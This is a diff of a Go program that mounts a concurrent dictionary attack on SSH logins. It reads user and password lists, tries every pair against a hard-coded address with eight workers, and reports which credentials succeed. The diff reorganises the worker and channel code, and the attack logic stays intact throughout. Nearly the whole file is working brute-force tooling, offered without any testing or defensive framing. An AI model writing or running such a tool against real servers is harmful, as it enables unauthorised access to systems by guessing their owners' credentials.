@@ -15,24 +15,7 @@ import (
 
 const TARGET = "192.168.1.42"
 
-type credential struct {
-	user      string
-	pass      string
-	pos       string
-	timeTaken time.Duration
-	err       error
-}
-
-type request struct {
-	cred *credential
-	resp chan<- *result
-}
-
-type result struct {
-	cred *credential
-	res  string
-	err  error
-}
+var wg sync.WaitGroup
 
 func check(e error) {
 	if e != nil {
@@ -40,9 +23,24 @@ func check(e error) {
 	}
 }
 
-var wg sync.WaitGroup
+type credential struct {
+	user string
+	pass string
+	pos  string
+}
 
-// Dictionary reader, the answer flow to the return channel
+type requestAttack struct {
+	cred    *credential
+	resChan chan<- *result
+}
+
+type result struct {
+	cred      *credential
+	timeTaken time.Duration
+	res       string
+	err       error
+}
+
 func readFiles(
 	userFile string,
 	passFile string,
@@ -72,10 +70,8 @@ func readFiles(
 				for j := 0; ureader.Scan(); j++ {
 					userList = append(userList, ureader.Text())
 					credentialStream <- &credential{user: userList[len(userList)-1],
-						pass:      preader.Text(),
-						pos:       strconv.Itoa(i) + "-" + strconv.Itoa(j),
-						timeTaken: 0,
-						err:       nil}
+						pass: preader.Text(),
+						pos:  strconv.Itoa(j) + "-" + strconv.Itoa(i)}
 				}
 				if err := ureader.Err(); err != nil {
 					check(err)
@@ -83,10 +79,8 @@ func readFiles(
 			} else {
 				for j, u := range userList {
 					credentialStream <- &credential{user: u,
-						pass:      preader.Text(),
-						pos:       strconv.Itoa(i) + "-" + strconv.Itoa(j),
-						timeTaken: 0,
-						err:       nil}
+						pass: preader.Text(),
+						pos:  strconv.Itoa(j) + "-" + strconv.Itoa(i)}
 				}
 			}
 		}
@@ -97,27 +91,6 @@ func readFiles(
 	return credentialStream
 }
 
-func worker(reqChan <-chan *request) {
-	for {
-		if r, ok := <-reqChan; ok {
-			res, err := r.cred.SSHtest()
-			// res, err := r.cred.attackTest()
-			r.resp <- &result{cred: r.cred, res: res, err: err}
-		} else {
-			fmt.Println("F worker")
-			break
-		}
-
-	}
-
-}
-
-// func (c *credential) attackTest() (string, error) {
-// 	time.Sleep(time.Millisecond * 10)
-// 	return "ok", nil
-// }
-
-// Test SSH
 func (c *credential) SSHtest() (string, error) {
 	//SSH basic connection
 	config := &ssh.ClientConfig{
@@ -146,68 +119,81 @@ func (c *credential) SSHtest() (string, error) {
 	return "ok", err
 }
 
-func (c *credential) resolveConcurrently(reqChan chan<- *request, credChan chan<- *credential) {
-	startTime := time.Now()
-	defer func() {
-		c.timeTaken = time.Since(startTime)
-	}()
+func worker(reqStream <-chan *requestAttack, name string) {
+	for {
+		if r, ok := <-reqStream; ok {
+			t := time.Now()
+			res, err := r.cred.SSHtest()
 
-	credRespChan := make(chan *result)
-	reqChan <- &request{cred: c, resp: credRespChan}
-	resp := <-credRespChan
-	if resp.err != nil {
-		c.err = resp.err
+			r.resChan <- &result{cred: r.cred, timeTaken: time.Since(t), res: res, err: err}
+		} else {
+			fmt.Println("[worker " + name + "] DEAD")
+		}
 	}
-	credChan <- c
+}
+
+func (c *credential) manageConcurrently(
+	reqStream chan<- *requestAttack,
+	resultStream chan<- *result) {
+	responseChan := make(chan *result)
+
+	// send a request to a worker
+	reqStream <- &requestAttack{cred: c, resChan: responseChan}
+
+	// get the response
+	response := <-responseChan
+
+	//manage de response
+	/*
+		TODO
+	*/
+
+	//send response result
+	resultStream <- response
 	wg.Done()
 }
 
-func doConcurrently(reqChan chan<- *request, credList <-chan *credential) {
-	credChan := make(chan *credential)
+func startAttack(nWorkers int) {
+	reqStream := make(chan *requestAttack)
+
+	for i := 0; i < nWorkers; i++ {
+		fmt.Println("[worker", i, "] Staying Alive")
+		go worker(reqStream, fmt.Sprint(i))
+	}
+
+	credList := readFiles("../users.txt", "../passwords.txt")
+
+	resultStream := make(chan *result)
 	numCredentials := 0
 
 	go func() {
 		for c := range credList {
 			numCredentials++
 			wg.Add(1)
-			go c.resolveConcurrently(reqChan, credChan)
+			go c.manageConcurrently(reqStream, resultStream)
 		}
-
 		wg.Wait()
-		close(credChan)
-		close(reqChan)
-		fmt.Println("[!]Closing the channels...")
+		close(reqStream)
+		close(resultStream)
+		fmt.Println("[!] Closing the channels")
 	}()
 
-	for c := range credChan {
-		if c.err == nil {
-			fmt.Printf("[+] %v\t%v\t%v\t%v\n", c.user+":"+c.pass, c.pos, c.timeTaken, c.err)
+	for r := range resultStream {
+		if r.err == nil {
+			fmt.Printf("[+] %v\t%v\t%v\t%v\n", r.cred.user+":"+r.cred.pass, r.cred.pos, r.timeTaken, r.err)
 		} else {
-			// var a string
-			// a = c.err
-			fmt.Printf("[-] %v\t%v\t%v\t%v\n", c.user+":"+c.pass, c.pos, c.timeTaken, c.err.Error()[:30]+"...")
+			fmt.Printf("[-] %v\t%v\t%v\t%v\n", r.cred.user+":"+r.cred.pass, r.cred.pos, r.timeTaken, r.err)
 		}
 	}
 
-	fmt.Println("##############  finish")
-}
-
-func resolveConcurrently(nPoolSize int) {
-	reqChan := make(chan *request)
-
-	for i := 0; i < nPoolSize; i++ {
-		go worker(reqChan)
-	}
-
-	doConcurrently(reqChan, readFiles("../users.txt", "../passwords.txt"))
 }
 
 func main() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	start := time.Now()
+	startAttack(8)
 
-	resolveConcurrently(8)
-	// return time.Since(start)
-	fmt.Printf("Atack took: %v", time.Since(start))
+	fmt.Printf("Atack took: %v\n", time.Since(start))
+
 }
